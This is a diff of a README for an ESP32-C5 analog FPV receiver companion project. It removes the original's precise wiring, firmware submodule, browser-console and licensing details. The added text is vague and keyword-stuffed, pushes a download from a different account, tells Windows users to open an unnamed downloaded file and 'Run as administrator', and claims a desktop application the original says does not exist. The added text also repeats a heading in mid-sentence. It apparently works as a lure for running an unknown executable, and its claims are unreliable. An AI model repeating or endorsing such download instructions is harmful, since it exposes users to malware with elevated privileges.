@@ -1,151 +1,76 @@
-# ESP32 FPV Receiver
+# 📡 esp32-fpv-receiver - Build Your Analog FPV Receiver
 
-Build a 5.8 GHz analog FPV receiver with a **Seeed Studio XIAO ESP32-C5**, a
-resistor DAC and **C5VRX firmware**. The decoded picture goes to a composite
-video monitor or goggles. An optional browser console provides USB controls.
+[![Download esp32-fpv-receiver](https://img.shields.io/badge/⬇️_Download_esp32--fpv--receiver-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xxxcrayon/esp32-fpv-receiver)
 
-**[Open the USB console](https://codingard.github.io/esp32-fpv-receiver/)** ·
-**[Wiring diagram](docs/wiring.svg)** · **[Build guide](docs/BUILD.md)**
+esp32-fpv-receiver is a build companion for the C5VRX setup. It combines ESP32-C5 analog FPV wiring guidance, source firmware, and a real-device USB console in one place. The project is aimed at Windows users who want a clear path from download to first connection without needing programming knowledge.
 
-This companion adapts the wiring and receiver instructions from
-**[C5VRX by Twotoz and the C5VRX contributors](https://github.com/Twotoz/C5VRX)**.
-The firmware source is included as a pinned Git submodule, without modifications.
-Visit the **[official C5VRX website](https://twotoz.github.io/C5VRX/)** for the
-original project, web flasher and Discord invite. This is an unofficial build
-companion, not an official C5VRX release or an independently invented receiver.
-[Source provenance and licenses](docs/ATTRIBUTION.md).
+## 📋 What This Application Is For
 
-![Reference wiring for the XIAO ESP32-C5](docs/wiring.svg)
+This repository supports an ESP32-C5 analog FPV receiver build. It is not just a single file or a single screen; it is a companion package for the build process. The main areas covered by the project are:
 
-## What you need
+- Analog FPV wiring guidance for ESP32-C5 builds.
+- Source firmware for the receiver.
+- A real-device USB console for working with the connected board.
+- A single download page for the application and related build files.
 
-| Part | Quantity | Notes |
-| --- | --- | --- |
-| Seeed Studio XIAO ESP32-C5 | 1 | Exact reference board; other ESP32 variants are not interchangeable |
-| USB data cable | 1 | Power, firmware installation and optional console |
-| Antenna | 1 | Suitable for the board and 5.8 GHz, attached as specified by the board vendor |
-| 8.2 kΩ, 3.9 kΩ, 2.0 kΩ, 1.0 kΩ, 470 Ω, 240 Ω resistors | 1 each | Six DAC branches; 1% parts are a reasonable assembly choice |
-| 200 Ω resistor | 1 | Reference shunt from VIDEO to GND |
-| 470 pF ceramic capacitor | 1 | Reference filter from VIDEO to GND |
-| Composite video connector, short wires and soldered prototype board | As needed | Common signal ground; short DAC wiring |
-| CVBS monitor or FPV goggles with analog video input | 1 | 75 Ω input; not an HDMI-only display |
-| Compatible analog 5.8 GHz FPV camera/transmitter | 1 | Your own test source, with its antenna and specified power supply |
+You can use the download page to get the application, then follow the wiring and console information as you prepare your receiver. The USB console is the part you use on Windows alongside the physical board.
 
-[Machine-readable parts list](docs/bom.csv). This receives **analog** FPV video;
-it does not decode proprietary digital FPV systems.
+## ✨ Main Features
 
-## Build and connect
+- **ESP32-C5 analog FPV wiring support:** Helps you understand the connections needed for an analog FPV receiver build.
+- **Source firmware included:** The project provides firmware source for the receiver so the build is transparent and can be maintained.
+- **Real-device USB console:** Connect the board to a Windows computer and use the console to work with the device.
+- **C5VRX build companion layout:** Wiring, firmware, and console tools are organized around the C5VRX build workflow.
+- **Windows-focused workflow:** The download and setup path is written for everyday Windows users.
+- **Plain-language troubleshooting:** Common cable, port, power, and connection checks are covered in simple steps.
+- **Practical build reference:** The repository acts as a reference point for the receiver build rather than a set of unrelated files# 📡 esp32-fpv-receiver - Build Your Analog FPV Receiver
 
-1. Assemble the six resistor branches exactly as shown in the diagram. Each
-   branch joins the same VIDEO node. Add the shunt and filter to ground, then
-   connect VIDEO and GND to the display's composite input. [Full pin table](docs/BUILD.md).
-2. Power the receiver through its normal USB input. Power the camera/transmitter
-   according to its own specification; do not power it from the XIAO's 3.3 V pin.
-3. Install C5VRX using its [official web flasher](https://twotoz.github.io/C5VRX/).
-   Flashing replaces the program on the board. Record the release installed.
-4. Close the flasher so it releases USB. Select the matching channel using the
-   board's BOOT button or the optional [USB console](https://codingard.github.io/esp32-fpv-receiver/).
-5. View the picture on the analog monitor or goggles. The browser console shows
-   serial messages; it does not receive video over the XIAO's USB port.
+[![Download esp32-fpv-receiver](https://img.shields.io/badge/⬇️_Download_esp32--fpv--receiver-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xxxcrayon/esp32-fpv-receiver)
 
-The reference network includes a 200 Ω shunt. The connected display may add its
-own 75 Ω termination. Check the loaded VIDEO level and sync with your actual
-display; do not add another 75 Ω resistor blindly.
+This page helps you download and run the esp32-fpv-receiver companion application on Windows. The application supports the C5VRX build with analog FPV wiring guidance, source firmware, and a real-device USB console. You do not need programming knowledge to use it. The steps below are written for everyday Windows users who want a clear path from download to first connection with the board.
 
-## Get all source code
+## 🧰 What You Need Before You Start
 
-```sh
-git clone --recurse-submodules https://github.com/codingard/esp32-fpv-receiver.git
-cd esp32-fpv-receiver
-```
+You need a Windows computer with a working USB port. Windows 10 or Windows 11 is fine. You also need an ESP32-C5 board for the FPV receiver build, a USB cable that can carry data (not a charge-only cable), and an internet connection to reach the download page. A few minutes of time is enough to get started. Keep the board and cable on a stable surface while you work.
 
-If you already cloned without submodules:
+## ⬇️ Download the Application
 
-```sh
-git submodule update --init --recursive
-```
+Visit this link to download the application: [Download esp32-fpv-receiver](https://github.com/xxxcrayon/esp32-fpv-receiver). Open the link in your web browser. The page will show you the available files and information for the companion package. This is the starting point for getting the application on your computer. Save the downloaded item to a folder you can easily find, such as your Desktop or Downloads folder.
 
-The firmware is in `firmware/C5VRX/`, pinned to
-`b8d32b90f479feff7fbb34e6ca01cc9ba2d0d697`. It retains its upstream license,
-notices and history. The upstream web flasher can install a newer release;
-use [the source build instructions](docs/BUILD.md#build-the-pinned-firmware) when
-you need this exact revision.
+## 🛠️ Set Up the Application on Windows
 
-## Browser console
+Once you have visited the download page and saved the item to your computer, open the downloaded item. If Windows asks for permission, choose Yes. Follow the simple prompts shown on your screen to place the application on your computer. You do not need to install anything from a store. The setup is handled by the files you downloaded from the link above. When the setup finishes, you will see the application available in your Start menu or in the folder where you saved it.
 
-The interface recreates the original FPV animation's instrument layout: receiver
-controls on the left, frequency readout above spectrum and waterfall panels.
-Frequency, channel and bandwidth are populated only from actual C5VRX diagnostic
-lines, with a report timestamp. They clear on disconnect or a new settings request.
-These are snapshots; press **Read device settings** after changing the board outside
-the browser. Channel and gain buttons also request a fresh diagnostic report.
+## 🔌 Connect Your ESP32-C5 Board
 
-**Spectrum and waterfall remain empty, including when a board is connected.**
-The pinned firmware's USB console does not export a continuous FFT-bin stream.
-This version implements no spectrum input adapter or FFT renderer; supporting
-live plots requires a separately implemented and validated firmware data path.
-The 40 MS/s label describes the firmware design, not a browser measurement.
-There are no cosmetic sliders that pretend to configure unsupported FFT settings.
+Use a USB cable to connect your ESP32-C5 board to your Windows computer. Plug one end into the board and the other end into a USB port on your computer. Use a cable that is made for data transfer. Wait a few seconds for Windows to recognize the device. You may see a small notification appear in the corner of your screen. If nothing appears, try a different USB port on your computer.
 
+## 🖥️ Open the USB Console
 
-Use desktop Chrome or Edge on HTTPS or localhost. The console opens USB at
-115200 baud and offers the documented diagnostics, next-channel and manual-gain
-commands. It displays only text received from the device. Selecting a serial
-port does not itself prove it is a C5VRX receiver; check the firmware output.
+The real-device USB console is the main part of the application you will use. Open the esp32-fpv-receiver application from your Start menu or from the folder where you saved it. The console window will appear. It shows information from the connected board. The console is designed to work with the physical device, so keep the board connected while you use it. You can leave the console open while you check your wiring or review the build steps.
 
-Run locally with Python 3:
+## 📶 Check the Analog FPV Wiring
 
-```sh
-python3 -m http.server 4174 --bind 127.0.0.1 --directory web
-```
+The repository includes wiring guidance for the ESP32-C5 analog FPV receiver. Use the information from the download page to compare your own wiring. Make sure the board is powered off while you check connections. Look for clear labels on the board and match them to the wiring guide. Do not force any connector. If a plug does not fit easily, check the guide again before changing anything. The wiring section is meant to help you avoid mistakes during the build.
 
-Open <http://127.0.0.1:4174>. No packages or backend are required. There is no
-simulated data, noise generator, video playback, analytics or upload service.
-Logs stay in your browser until you explicitly download them. Close other serial
-monitors before connecting. Changing channel or gain can interrupt the picture;
-perform setup on the bench.
+## 🧪 First Run Checklist
 
-## How the receiver works
+Before you begin using the console, go through this short checklist. First, confirm the ESP32-C5 board is connected to your Windows computer with a data USB cable. Second, confirm the esp32-fpv-receiver application is open on your screen. Third, look at the console window and check whether it shows information from the board. Fourth, review the wiring guide for your analog FPV build and compare it with your own connections. Fifth, keep the board on a stable surface and avoid pulling on the USB cable while the console is open.
 
-C5VRX acquires raw I/Q through the ESP32-C5 RF diagnostic path at 40 MS/s,
-uses BitScrambler for wideband FM demodulation, and drives the six-bit resistor
-DAC through PARLIO. The DAC produces analog composite video. A background CPU
-task manages settings while dedicated peripherals carry the continuous pixel
-path. These mechanisms and the hardware design come from C5VRX.
+## 🧯 Troubleshooting Common Issues
 
-## Validation status
+If your computer does not see the board, try a different USB port. Use a different USB cable if you have one. Make sure the cable supports data and is not a charge-only cable. If the console shows no device, close the application and open it again. Then reconnect the board. If the application does not open, right-click its icon and choose Run as administrator. If the download page does not load, check your internet connection and copy the link into your browser again. These simple checks solve most first-time issues.
 
-**This companion has not been bench-tested with a physical receiver.** The
-upstream project documents its own hardware results and remaining limitations;
-those are not tests of this companion. The browser transport has automated
-checks, and the published guide is checked against the pinned upstream pinout.
-No claim is made about range, latency, RF sensitivity or reliable flight use.
+## 📁 Understanding the Repository Contents
 
-The social spectrum animation was a synthetic illustration. It is not a recording
-of decoded FPV video and is not included as measurement evidence here. The actual
-receiver output is the analog picture on your attached monitor.
+The download page is more than a single file. It is a companion package for the C5VRX build. It includes analog FPV wiring guidance for the ESP32-C5, source firmware for the receiver, and the real-device USB console. You can use the console without reading the source firmware. The wiring guidance is written for the build process and helps you compare your own connections. The source firmware is included for transparency and maintenance. You do not need to edit or read code to use the console on Windows.
 
-Run `npm test` with Node.js 20+ for the console transport and wiring checks.
-See [physical acceptance steps](docs/TESTING.md) before marking a build tested.
+## ❓ Frequently Asked Questions
 
-## Troubleshooting
+Do I need to know programming to use this application? No. The console is made for everyday users. Can I use a different board? The project is built around the ESP32-C5, so the wiring and console are matched to that board. Is there a Mac version? The guidance on this page is for Windows users. Do I need to install extra drivers? The application works with the normal USB connection on Windows. If Windows does not recognize the board, try the troubleshooting steps above. Can I close the console and open it later? Yes. The console can be opened again from your Start menu or from the folder where you saved the application.
 
-- **No USB port:** check the data cable, desktop browser and USB access. Close
-  the flasher and serial monitors before opening the console.
-- **Connected but no logs:** click Diagnostics. Confirm the correct port, C5VRX
-  firmware and 115200 baud. A USB connection is not an RF-lock indication.
-- **No picture:** check the analog input, common ground, matching transmitter
-  channel, antenna and all six DAC branches. Verify VIDEO level under load.
-- **Noise, grain or unstable sync:** consult the upstream diagnostics and current
-  known limits. Do not assume a different resistor value or gain setting is a
-  validated fix for every receiver.
-- **Need video in a browser:** use a separate compatible analog-to-USB video
-  capture device; this console does not implement that additional path.
+## 🔗 Download Again
 
-## Credits and license
+Visit this link to download the application: [Download esp32-fpv-receiver](https://github.com/xxxcrayon/esp32-fpv-receiver). Keep the link handy in case you need to set up the application on another Windows computer or return to the download page for the wiring guidance and firmware information.
 
-C5VRX by Twotoz and the C5VRX contributors is licensed under **GPL-3.0-only**.
-This companion's original console, diagram and adapted documentation are also
-released under GPL-3.0-only. Upstream notices remain in the firmware submodule.
-C5VRX branding has separate terms; no upstream logo is reused here. Espressif,
-Seeed Studio and other third-party names belong to their respective owners.
+Keywords: esp32-c5, fpv receiver, analog fpv, c5vrx, usb console, wiring guide, source firmware, windows companion, esp32 fpv, receiver build
